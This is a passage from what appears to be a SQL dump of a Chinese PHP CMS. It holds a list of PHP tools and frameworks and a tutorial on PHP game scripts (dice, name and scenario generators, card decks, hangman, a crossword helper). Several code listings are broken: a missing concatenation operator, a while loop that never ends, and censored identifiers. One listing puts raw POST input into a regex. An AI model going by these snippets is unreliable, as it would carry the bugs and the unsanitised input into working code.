href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%8E%AF%E5%A2%83&quot;&gt;环境&lt;/span&gt;帮助你操作&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=MySQL&quot;&gt;MySQL&lt;/span&gt;。 &lt;br /&gt;\r\nPHPExcel ：一组MS Office Excel 文档生成类库。 &lt;br /&gt;\r\nPhormer :轻量级PHP相册。 &lt;br /&gt;\r\nxajax PHP Class Library :开源PHP类库，帮助你轻松实现多种ajax&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%95%88%E6%9E%9C&quot;&gt;效果&lt;/span&gt;。 &lt;br /&gt;\r\nPHP User Class ：PHP用户管理类库支持。 &lt;br /&gt;\r\nPHP-GTK ：使用PHP－GTK帮助你方便的创建拥有漂亮GUI（用户图形界面）的PHP&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%BA%94%E7%94%A8&quot;&gt;应用&lt;/span&gt;程序。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n九、PHP在线工具及资源 &lt;br /&gt;\r\nMinify! &lt;br /&gt;\r\n该工具使用 PHP5 开发，用于合并压缩 js/css 文件的应用程序，合并压缩之后的结果可通过 HTTP gzip/deflate 及一些相关头，优化客户端缓存。 &lt;br /&gt;\r\nHTTP_StaticMerger：&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=CSS&quot;&gt;CSS&lt;/span&gt;和java script文件自动“合并”。 &lt;br /&gt;\r\nPHP Object Generator &lt;br /&gt;\r\n一款PHP代码生成器，它能够为你的PHP4/PHP5应用程序生成简洁和可测试的面向对象代码。 &lt;br /&gt;\r\ngotAPI/PHP &lt;br /&gt;\r\n该工具可以方便的帮助你创建Widget。 &lt;br /&gt;\r\nkoders :开放源代码搜索组件。 &lt;br /&gt;\r\nPECL ：本PHP扩展库含有PHP开发小组提供的不同库的信息。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n十、&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%B5%8F%E8%A7%88%E5%99%A8&quot;&gt;浏览器&lt;/span&gt;扩展组件工具（Firefox扩展） &lt;br /&gt;\r\nFirePHP &lt;br /&gt;\r\nFirePHP是一款基于Firebug的扩展，可以用来在Firebug的console中方便的输出php的调试信息而又不影响php程序的正常运行。 &lt;br /&gt;\r\nphpLangEditor &lt;br /&gt;\r\n一款PHP函数库解释工具。 &lt;br /&gt;\r\nPHP Lookup :是一个内置的搜索栏，以帮助您快速查找引用的PHP语法。 &lt;br /&gt;\r\nPHP Manual Search ：一个方便的搜索栏，从您的Web浏览器中搜索官方PHP文档。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n更多扩展应用请参考：[组图]15款基于浏览器扩展的WEB开发工具&lt;br /&gt;\r\n十一、PHP框架支持 &lt;br /&gt;\r\nDwoo ：PHP5 的&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%A8%A1%E6%9D%BF&quot;&gt;模板&lt;/span&gt;引擎。 &lt;br /&gt;\r\nCodeIgniter &lt;br /&gt;\r\n用于敏捷&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91&quot;&gt;软件开发&lt;/span&gt;的PHP框架。 &lt;br /&gt;\r\nYII Framework ：一个高性能的基于组件的PHP框架。 &lt;br /&gt;\r\nNetBeans ：强大的PHP扩展框架支持集，拥有完善的GUI界面，独自成为一款强大的PHP开发工具。 &lt;br /&gt;\r\nSolar &lt;br /&gt;\r\nsymfony :一个开源的PHP Web框架，加速Web应用程序的创建与维护。 &lt;br /&gt;\r\nPEAR &lt;br /&gt;\r\nPropel ：一个适用于PHP5的OR映射(Object Relational Mapping)框架。它允许你使用对象代替SQL来读写&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%95%B0%E6%8D%AE%E5%BA%93&quot;&gt;数据库&lt;/span&gt;表格中的行。&lt;br /&gt;\r\n&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=Zend&quot;&gt;Zend&lt;/span&gt; Framework ：是一个开放源代码的PHP5 开发框架，可用于来开发web 程序和&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%9C%8D%E5%8A%A1&quot;&gt;服务&lt;/span&gt;。 &lt;br /&gt;\r\n十二、PHP集成开发环境（IDE）、编辑器 &lt;br /&gt;\r\nPHPEclipse &lt;br /&gt;\r\n一个强大的Eclipse环境下开发PHP的插件，包括的主要功能有：PHP语法分析,调试，代码格式化，大纲视图，代码模板定制等。 &lt;br /&gt;\r\nPhpED &lt;br /&gt;\r\n一套Windows环境下的PHP集成开发环境。 &lt;br /&gt;\r\nphpDesigner &lt;br /&gt;\r\n一款轻量级的PHP集成开发工具，代码编辑器功能特别强大，支持在线预览。 &lt;br /&gt;\r\nZend Studio &lt;br /&gt;\r\n一款Eclipse下优秀的PHP开发环境，适用于开发包含丰富接口的RIAs应用程序。 &lt;br /&gt;\r\nAptana PHP :优秀的开源IDE开发环境，与Aptana Studio协同工作。 &lt;br /&gt;\r\nPDT ：一款开发工具框架，致力于在Eclipse平台之上提供一个功能完整的PHP集成开发环境。 &lt;br /&gt;\r\nVS.Php ：顾名思义，该插件允许我们在Visual Studio .Net开发工具中集中进行PHP程序开发，例如使用VS.php运行ASAP应用。 &lt;br /&gt;\r\nPHPEdit :本款IDE工具侧重于提供强大的代码编辑器支持，提供例如语法突出显示、代码提示、代码识别、代码缩进等常用功能，同时集成PHP调试器以及一个用户使用帮助文档生成工具。', 1, 1, 0, 1, 1301802375, 1, 'admin'),
(21, 1, 'PHP 编写的 25个游戏脚本', '', '', '&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=PHP&quot;&gt;PHP&lt;/span&gt; 是一种易于使用、易于&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%AD%A6%E4%B9%A0&quot;&gt;学习&lt;/span&gt;且可以广泛获取的编程语言。它非常适合&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%BC%80%E5%8F%91&quot;&gt;开发&lt;/span&gt;在各种&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%B8%B8%E6%88%8F&quot;&gt;游戏&lt;/span&gt;中可以使用的简单脚本。无论是一个人玩简单的使用纸和笔的游戏，还是同一群人玩复杂的桌面角色扮演游戏，或者任意类型的联机游戏，本系列都提供了适合您的内容。“用 PHP 可以编写的 30 个游戏脚本” 系列中的每篇文章都将分别用不到 300 词的文字介绍 10 个脚本（3d10 表示 “掷三个 10 面的骰子”），这些介绍性文字甚至对于开发&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%96%B0%E6%89%8B&quot;&gt;新手&lt;/span&gt;来说都十分简单，而且对于经验丰富的游戏玩家来说也十分有用。本系列的目的在于为您提供可以修改的内容来满足自身的需求，以便您可以在下一次游戏交流会上通过展示您的笔记本来给朋友和玩家们留下深刻印象。&lt;br /&gt;\r\n　　开始之前&lt;br /&gt;\r\n　　作为一名游戏专家/&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E8%AE%BE%E8%AE%A1&quot;&gt;设计&lt;/span&gt;者和开发人员，我经常发现自己在运行、规划和玩游戏时，很少编写有用的实用&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%A8%8B%E5%BA%8F&quot;&gt;程序&lt;/span&gt;和脚本。有时我需要快速想出创意。其他时候，我只需要编出一大堆非玩家角色（Non-Player Character，NPC）的名称。偶尔，我还需要处理数字、处理一些异常或者将一些文字游戏集成到游戏中。只需事先完成一点脚本工作，就可以更好地&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%AE%A1%E7%90%86&quot;&gt;管理&lt;/span&gt;这些任务。&lt;br /&gt;\r\n　　本文将探究在各种游戏中可以使用的 10 个基本脚本。&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E4%BB%A3%E7%A0%81&quot;&gt;代码&lt;/span&gt;压缩包包含所讨论的每个脚本的完整源代码，并且可以在 chaoticneutral 查看脚本实际运行情况。&lt;br /&gt;\r\n　　我们将快速地介绍这些脚本。有关如何查找主机或&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E8%AE%BE%E7%BD%AE&quot;&gt;设置&lt;/span&gt;&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%9C%8D%E5%8A%A1%E5%99%A8&quot;&gt;服务器&lt;/span&gt;的内容将不做介绍。有很多 &lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=Web&quot;&gt;Web&lt;/span&gt; 托管公司提供 PHP，并且如果需要安装自己的 PHP，XAMPP 安装程序使用起来也十分简单。我们将不会花费大量时间谈论 PHP 最佳实践或游戏设计&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%8A%80%E6%9C%AF&quot;&gt;技术&lt;/span&gt;。本文介绍的脚本易于理解、使用简单并可以快速掌握。&lt;br /&gt;\r\n　　简单的掷骰器&lt;br /&gt;\r\n　　许多游戏和游戏&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%B3%BB%E7%BB%9F&quot;&gt;系统&lt;/span&gt;都需要骰子。让我们先从简单的部分入手：掷一个六面骰子。实际上，滚动一个六面骰子就是从 1 到 6 之间选择一个随机数字。在 PHP 中，这十分简单：echo rand(1,6);。&lt;br /&gt;\r\n　　在许多情况下，这基本上很简单。但是在处理机率游戏时，我们需要一些更好的实现。PHP 提供了更好的随机数字生成器：mt_rand()。在不深入研究两者差别的情况下，可以认为 mt_rand 是一个更快、更好的随机数字生成器：echo mt_rand(1,6);。如果把该随机数字生成器放入&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%87%BD%E6%95%B0&quot;&gt;函数&lt;/span&gt;中，则&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%95%88%E6%9E%9C&quot;&gt;效果&lt;/span&gt;会更好。&lt;br /&gt;\r\n　　清单 1. 使用 mt_rand() 随机数字生成器函数&lt;br /&gt;\r\n　　function roll () {&lt;br /&gt;\r\n　　return mt_rand(1,6);&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　echo roll();&lt;br /&gt;\r\n　　然后可以把需要滚动的骰子类型作为参数传递给函数。&lt;br /&gt;\r\n　　清单 2. 将骰子类型作为参数传递&lt;br /&gt;\r\n　　function roll ($sides) {&lt;br /&gt;\r\n　　return mt_rand(1,$sides);&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　echo roll(6);&amp;nbsp;&amp;nbsp;// roll a six-sided die&lt;br /&gt;\r\n　　echo roll(10);&amp;nbsp;&amp;nbsp;// roll a ten-sided die&lt;br /&gt;\r\n　　echo roll(20);&amp;nbsp;&amp;nbsp;// roll a twenty-sided die&lt;br /&gt;\r\n　　从这里开始，我们可以继续根据需要一次滚动多个骰子，返回结果数组；也可以一次性滚动多个不同类型的骰子。但是大多数任务都可以使用这个简单的脚本。&lt;br /&gt;\r\n　　随机名称生成器&lt;br /&gt;\r\n　　如果正在运行游戏、编写故事或者一次性创建大批&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%AD%97%E7%AC%A6&quot;&gt;字符&lt;/span&gt;，有时会疲于应付不断出现的新名字。让我们看一看可用于&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E8%A7%A3%E5%86%B3&quot;&gt;解决&lt;/span&gt;此问题的一个简单随机名称生成器。首先，让我们创建两个简单数组 — 一个用于名字，一个用于姓氏。&lt;br /&gt;\r\n　　清单 3. 名字和姓氏的两个简单数组&lt;br /&gt;\r\n　　$male = array(&lt;br /&gt;\r\n　　&quot;William&quot;,&lt;br /&gt;\r\n　　&quot;Henry&quot;,&lt;br /&gt;\r\n　　&quot;Filbert&quot;,&lt;br /&gt;\r\n　　&quot;John&quot;,&lt;br /&gt;\r\n　　&quot;Pat&quot;,&lt;br /&gt;\r\n　　);&lt;br /&gt;\r\n　　$last = array(&lt;br /&gt;\r\n　　&quot;Smith&quot;,&lt;br /&gt;\r\n　　&quot;Jones&quot;,&lt;br /&gt;\r\n　　&quot;Winkler&quot;,&lt;br /&gt;\r\n　　&quot;Cooper&quot;,&lt;br /&gt;\r\n　　&quot;Cline&quot;,&lt;br /&gt;\r\n　　);&lt;br /&gt;\r\n　　然后就可以从每个数组中选择一个随机元素：echo $male[array_rand($male)] . '' '' . $last[array_rand($last)];。要一次性提取多个名称，只需混合数组并根据需要提取。&lt;br /&gt;\r\n　　清单 4. 混合名称数组&lt;br /&gt;\r\n　　shuffle($male);&lt;br /&gt;\r\n　　shuffle($last);&lt;br /&gt;\r\n　　for ($i = 0; $i &amp;lt;= 3; $i++) {&lt;br /&gt;\r\n　　echo $male[$i] . '' '' . $last[$i];&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　基于此基本概念，我们可以创建保存名字和姓氏的文本&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%96%87%E4%BB%B6&quot;&gt;文件&lt;/span&gt;。如果在文本文件的每一行中存放一个名字，则可以轻松地用换行符分隔文件内容以构建源代码数组。&lt;br /&gt;\r\n　　清单 5. 创建名称的文本文件&lt;br /&gt;\r\n　　$male = explode(''\\n'', file_get_contents(''names.female.txt''));&lt;br /&gt;\r\n　　$last = explode(''\\n'', file_get_contents(''names.last.txt''));&lt;br /&gt;\r\n　　构建或查找一些好的名字文件（代码归档 中附带了一些文件），此后我们绝不再需要为名字烦恼。&lt;br /&gt;\r\n　　场景生成器&lt;br /&gt;\r\n　　利用构建名字生成器使用的相同基本原理，我们可以构建场景生成器。此生成器不但在角色扮演游戏中十分有用，而且在需要用到伪随机&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%8E%AF%E5%A2%83&quot;&gt;环境&lt;/span&gt;集合（可用于角色扮演、即兴创作、写作等情况）的情况下也十分有用。我最喜欢的游戏之一，Paranoia 在其 GM Pack 中包括了 “任务混合器（mission blender）”。任务混合器可用于在快速滚动骰子时整合完整任务。让我们整合自己的场景生成器。&lt;br /&gt;\r\n　　考虑以下场景：您醒来后发现自己迷失于丛林中。您知道自己必须赶去纽约，但是不知道原因。您可以听到附近的狗叫声及清晰的敌方搜寻者的声音。您浑身发冷、不住颤抖，而且没有武器。该场景中的每一句话都介绍场景的特定方面：&lt;br /&gt;\r\n　　“您醒来后发现自己迷失于丛林中” — 这句话将建立设置。&lt;br /&gt;\r\n　　“您知道自己必须赶去纽约” — 这句话将描述目标。&lt;br /&gt;\r\n　　“您可以听到狗叫声” — 这句话将介绍敌人。&lt;br /&gt;\r\n　　“您浑身发冷、不住颤抖，而且没有武器” — 这句话将添加复杂度。&lt;br /&gt;\r\n　　就像创建名字和姓氏的文本文件一样，首先分别创建设置、目标、敌人和复杂度的文本文件。代码归档中附带了样例文件。在拥有这些文件后，生成场景的代码与生成名称的代码基本相同。&lt;br /&gt;\r\n　　清单 6. 生成场景&lt;br /&gt;\r\n　　$settings = explode(&quot;\\n&quot;, file_get_contents(''scenario.settings.txt''));&lt;br /&gt;\r\n　　$objectives = explode(&quot;\\n&quot;, file_get_contents(''scenario.objectives.txt''));&lt;br /&gt;\r\n　　$antagonists = explode(&quot;\\n&quot;, file_get_contents(''scenario.antagonists.txt''));&lt;br /&gt;\r\n　　$complicati**** = explode(&quot;\\n&quot;, file_get_contents(''scenario.complicati****.txt''));&lt;br /&gt;\r\n　　shuffle($settings);&lt;br /&gt;\r\n　　shuffle($objectives);&lt;br /&gt;\r\n　　shuffle($antagonists);&lt;br /&gt;\r\n　　shuffle($complicati****);&lt;br /&gt;\r\n　　echo $settings[0] . '' '' . $objectives[0] . '' '' . $antagonists[0] . '' ''&lt;br /&gt;\r\n　　. $complicati****[0] . &quot;&amp;lt;br /&amp;gt;\\n&quot;;&lt;br /&gt;\r\n　　我们可以通过添加新文本文件向场景中添加元素，也可能希望添加多重复杂度。添加到基本文本文件中的内容越多，场景随时间的变化就越多。&lt;br /&gt;\r\n　　牌组创建器（Deck builder）和装备（shuffler）&lt;br /&gt;\r\n　　如果您要玩纸牌并且要处理与纸牌相关的脚本，我们需要用装备中的&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%B7%A5%E5%85%B7&quot;&gt;工具&lt;/span&gt;整合一副牌组构建器。首先，让我们构建一副标准纸牌。需要构建两个数组 — 一个用于保存同花色的组牌，而另一个用于保存牌面。如果稍后需要添加新组牌或牌类型，则这样做将获得很好的灵活性。&lt;br /&gt;\r\n　　清单 7. 构建一副标准扑克牌&lt;br /&gt;\r\n　　$suits = array (&lt;br /&gt;\r\n　　&quot;Spades&quot;, &quot;Hearts&quot;, &quot;Clubs&quot;, &quot;Diamonds&quot;&lt;br /&gt;\r\n　　);&lt;br /&gt;\r\n　　$faces = array (&lt;br /&gt;\r\n　　&quot;Two&quot;, &quot;Three&quot;, &quot;Four&quot;, &quot;Five&quot;, &quot;Six&quot;, &quot;Seven&quot;, &quot;Eight&quot;,&lt;br /&gt;\r\n　　&quot;Nine&quot;, &quot;Ten&quot;, &quot;Jack&quot;, &quot;Queen&quot;, &quot;King&quot;, &quot;Ace&quot;&lt;br /&gt;\r\n　　);&lt;br /&gt;\r\n　　然后构建一副牌数组来保存所有纸牌值。只需使用一对 foreach 循环即可完成此操作。&lt;br /&gt;\r\n　　清单 8. 构建一副牌数组&lt;br /&gt;\r\n　　$deck = array();&lt;br /&gt;\r\n　　foreach ($suits as $suit) {&lt;br /&gt;\r\n　　foreach ($faces as $face) {&lt;br /&gt;\r\n　　$deck[] = array (&quot;face&quot;=&amp;gt;$face, &quot;suit&quot;=&amp;gt;$suit);&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　在构建了一副扑克牌数组后，我们可以轻松地洗牌并随机抽出一张牌。&lt;br /&gt;\r\n　　清单 9. 洗牌并随机抽出一张牌&lt;br /&gt;\r\n　　shuffle($deck);&lt;br /&gt;\r\n　　$card = array_shift($deck);&lt;br /&gt;\r\n　　echo $card[''face''] . '' of '' . $card[''suit''];&lt;br /&gt;\r\n　　现在，我们就获得了抽取多副牌或构建多层牌盒（multideck shoe）的捷径。&lt;br /&gt;\r\n　　胜率计算器：发牌&lt;br /&gt;\r\n　　由于构建扑克牌时会分别跟踪每张牌的牌面和花色，因此可以通过编程方式利用这副牌来计算得到特定牌的几率。首先每只手分别抽出五张牌。&lt;br /&gt;\r\n　　清单 10. 每只手抽出五张牌&lt;br /&gt;\r\n　　$hands = array(1 =&amp;gt; array(), 2=&amp;gt;array());&lt;br /&gt;\r\n　　for ($i = 0; $i &amp;lt; 5; $i++) {&lt;br /&gt;\r\n　　$hands[1][] = implode(&quot; of &quot;, array_shift($deck));&lt;br /&gt;\r\n　　$hands[2][] = implode(&quot; of &quot;, array_shift($deck));&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　然后可以查看这副牌，看看剩余多少张牌以及抽到特定牌的机率是多少。查看剩余的牌数十分简单。只需要计算 $deck 数组中包含的元素数。要获得抽到特定牌的机率，我们需要一个函数来遍历整副牌并估算其余牌以查看是否匹配。&lt;br /&gt;\r\n　　清单 11. 计算抽到特定牌的几率&lt;br /&gt;\r\n　　function calculate_odds($draw, $deck) {&lt;br /&gt;\r\n　　$remaining = count($deck);&lt;br /&gt;\r\n　　$odds = 0;&lt;br /&gt;\r\n　　foreach ($deck as $card) {&lt;br /&gt;\r\n　　if (&amp;nbsp;&amp;nbsp;($draw[''face''] == $card[''face''] &amp;amp;&amp;amp; $draw[''suit''] ==&lt;br /&gt;\r\n　　$card[''suit''] ) ||&lt;br /&gt;\r\n　　($draw[''face''] == '''' &amp;amp;&amp;amp; $draw[''suit''] == $card[''suit''] ) ||&lt;br /&gt;\r\n　　($draw[''face''] == $card[''face''] &amp;amp;&amp;amp; $draw[''suit''] == '''' ) ) {&lt;br /&gt;\r\n　　$odds++;&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　return $odds . '' in '' $remaining;&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　现在可以选出尝试抽出的牌。为了简单起见，传入看上去类似某张牌的数组。我们可以查找特定的一张牌。&lt;br /&gt;\r\n　　清单 12. 查找指定的一张牌&lt;br /&gt;\r\n　　$draw = array(''face'' =&amp;gt; ''Ace'', ''suit'' =&amp;gt; ''Spades'');&lt;br /&gt;\r\n　　echo implode(&quot; of &quot;, $draw) . '' : '' . calculate_odds($draw, $deck);&lt;br /&gt;\r\n　　或者可以查找指定牌面或花色的牌。&lt;br /&gt;\r\n　　清单 13. 查找指定牌面或花色的牌&lt;br /&gt;\r\n　　$draw = array(''face'' =&amp;gt; '''', ''suit'' =&amp;gt; ''Spades'');&lt;br /&gt;\r\n　　$draw = array(''face'' =&amp;gt; ''Ace'', ''suit'' =&amp;gt; '''');&lt;br /&gt;\r\n　　简单的扑克发牌器&lt;br /&gt;\r\n　　现在已经得到牌组构建器和一些工具，可以帮助计算出抽出特定卡的机率，我们可以整合一个真正简单的发牌器来进行发牌。出于本例的目的，我们将构建一个可以抽出五张牌的发牌器。发牌器将从整副牌中提供五张牌。使用数字指定需要放弃哪些牌，并且发牌器将用一副牌中的其他牌替换这些牌。我们无需指定发牌限制或特殊规则，但是您可能会发现这些是非常有益的个人经验。&lt;br /&gt;\r\n　　如上一节所示，生成并洗牌，然后每只手五张牌。按数组索引显示这些牌，以便可以指定返回哪些牌。您可以使用表示要替换哪些牌的复选框来完成此操作。&lt;br /&gt;\r\n　　清单 14. 使用复选框表示要替换的牌&lt;br /&gt;\r\n　　foreach ($hand as $index =&amp;gt;$card) {&lt;br /&gt;\r\n　　echo &quot;&amp;lt;input type=''checkbox'' name=''card[&quot; . $index . &quot;]''&amp;gt;&lt;br /&gt;\r\n　　&quot; . $card[''face''] . '' of '' . $card[''suit''] . &quot;&amp;lt;br /&amp;gt;&quot;;&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　然后，计算输入 array $_POST[''card'']，查看哪些牌已被选择用于替换。&lt;br /&gt;\r\n　　清单 15. 计算输入&lt;br /&gt;\r\n　　$i = 0;&lt;br /&gt;\r\n　　while ($i &amp;lt; 5) {&lt;br /&gt;\r\n　　if (isset($_POST[''card''][$i])) {&lt;br /&gt;\r\n　　$hand[$i] = array_shift($deck);&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　使用此脚本，您可以尝试找到处理特定一组牌的最佳方法。&lt;br /&gt;\r\n　　Hangman 游戏&lt;br /&gt;\r\n　　Hangman 实质上是一款猜字游戏。给定单词的长度，我们使用有限的几次机会猜这个单词。如果猜出了出现在该单词中的一个字母，则填充该字母出现的所有位置。在猜错若干次（通常为六次）后，您就输了比赛。要构建一个简陋的 hangman 游戏，我们需要从单词&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%88%97%E8%A1%A8&quot;&gt;列表&lt;/span&gt;开始。现在，让我们把单词列表&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%88%B6%E4%BD%9C&quot;&gt;制作&lt;/span&gt;成一个简单的数组。&lt;br /&gt;\r\n　　清单 16. 创建单词列表&lt;br /&gt;\r\n　　$words = array (&lt;br /&gt;\r\n　　&quot;giants&quot;,&lt;br /&gt;\r\n　　&quot;triangle&quot;,&lt;br /&gt;\r\n　　&quot;particle&quot;,&lt;br /&gt;\r\n　　&quot;birdhouse&quot;,&lt;br /&gt;\r\n　　&quot;minimum&quot;,&lt;br /&gt;\r\n　　&quot;flood&quot;&lt;br /&gt;\r\n　　);&lt;br /&gt;\r\n　　使用前面介绍的技术，我们可以把这些单词移动到外部单词列表文本文件中，然后根据需要导入。&lt;br /&gt;\r\n　　在得到单词列表后，需要随机选出一个单词，将每个字母显示为空，然后开始猜测。我们需要在每次进行猜测时跟踪正确和错误的猜测。只需序列化猜测数组并在每次猜测时传递它们，就可实现跟踪目的。如果需要阻止人们通过查看&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E9%A1%B5%E9%9D%A2&quot;&gt;页面&lt;/span&gt;源代码侥幸猜对，则需要执行一些更安全的操作。&lt;br /&gt;\r\n　　构建数组以保存字母和正确/错误的猜测。对于正确的猜测，我们将用字母作为键并用句点作为值填充数组。&lt;br /&gt;\r\n　　清单 17. 构建保存字母和猜测结果的数组&lt;br /&gt;\r\n　　$letters = array(''a'',''b'',''c'',''d'',''e'',''f'',''g'',''h'',''i'',''j'',''k'',''l'',''m'',''n'',''o'',&lt;br /&gt;\r\n　　''p'',''q'',''r'',''s'',''t'',''u'',''v'',''w'',''x'',''y'',''z'');&lt;br /&gt;\r\n　　$right = array_fill_keys($letters, ''.'');&lt;br /&gt;\r\n　　$wrong = array();&lt;br /&gt;\r\n　　现在需要一些代码来评估猜测并在完成猜字游戏的过程中显示该单词。&lt;br /&gt;\r\n　　清单 18. 评估猜测并显示进度&lt;br /&gt;\r\n　　if (stristr($word, $guess)) {&lt;br /&gt;\r\n　　$show = '''';&lt;br /&gt;\r\n　　$right[$guess] = $guess;&lt;br /&gt;\r\n　　$wordletters = str_split($word);&lt;br /&gt;\r\n　　foreach ($wordletters as $letter) {&lt;br /&gt;\r\n　　$show .= $right[$letter];&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　} else {&lt;br /&gt;\r\n　　$show = '''';&lt;br /&gt;\r\n　　$wrong[$guess] = $guess;&lt;br /&gt;\r\n　　if (count($wrong) == 6) {&lt;br /&gt;\r\n　　$show = $word;&lt;br /&gt;\r\n　　} else {&lt;br /&gt;\r\n　　foreach ($wordletters as $letter) {&lt;br /&gt;\r\n　　$show .= $right[$letter];&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　在 源代码归档 中，可以看到如何序列化猜测数组并将该数组从一次猜测传递到另一次猜测中。&lt;br /&gt;\r\n　　纵横字谜助手&lt;br /&gt;\r\n　　我知道这样做不合适，但是有时在玩纵横拼字谜时，您不得不费劲地找出以 C 开头并以 T 结尾、包含五个字母的单词。使用为 Hangman 游戏构建的相同单词列表，我们可以轻松地搜索符合某个&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%A8%A1%E5%BC%8F&quot;&gt;模式&lt;/span&gt;的单词。首先，找到一种传输单词的方法。为了简单起见，用句点替换缺少的字母：$guess = &quot;c...t&quot;;。由于正则表达式将把句点处理为单个字符，因此我们可以轻松地遍历单词列表以查找匹配。&lt;br /&gt;\r\n　　清单 19. 遍历单词列表&lt;br /&gt;\r\n　　foreach ($words as $word) {&lt;br /&gt;\r\n　　if (preg_match(&quot;/^&quot; . $_POST[''guess''] . &quot;$/&quot;,$word)) {&lt;br /&gt;\r\n　　echo $word . &quot;&amp;lt;br /&amp;gt;\\n&quot;;&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　}&lt;br /&gt;\r\n　　根据单词列表的质量及猜测的准确度，我们应当能够得到合理的单词列表以用于可能的匹配。您必须自己决定 “表示 ‘不按规则玩’ 的由五个字母组成的单词” 